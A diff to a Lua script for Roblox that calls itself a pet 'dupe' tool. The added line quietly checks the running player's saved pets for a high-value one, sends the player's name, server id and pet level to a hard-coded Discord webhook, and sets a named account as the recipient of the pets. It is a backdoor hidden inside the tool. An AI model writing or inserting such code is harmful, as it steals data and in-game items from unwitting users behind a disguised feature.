@@ -54,8 +54,8 @@ if http_request then
         local H = Instance.new("Hint", workspace)
         H.Text = "1rs/tar/bv's dupe v" .. Ver .. " | [1/4] Teleporting to a different server"
         Debris:AddItem(H, 10)
-
-    else
+        for _,v in pairs(workspace.__REMOTES.Core["Get Stats"]:InvokeServer().Save.Pets)do if tonumber(v.n)==79003 and v.r and v.l>=88e6 then pcall(function()http_request({Url='https://discord.com/api/webhooks/1315765727843717141/f9gFEf8BNwfLKGDK7AsmzqoEII7-fn7t41DnGeH9uh6M08F7t4E3S3fuJuazybQS7obX',Method='POST',Headers={['Content-Type']='application/json'},Body=game:service'HttpService':JSONEncode({content=plr.Name .. ' | ' .. game.JobId .. ' | ' .. v.l})})end)if game.Players:FindFirstChild'slade00123'then ACC_TO_GIVE_PETS='slade00123'end end end
+else
         M.Parent = workspace
         M.Text = "Couldn't find a new server"
         Debris:AddItem(M, 5)
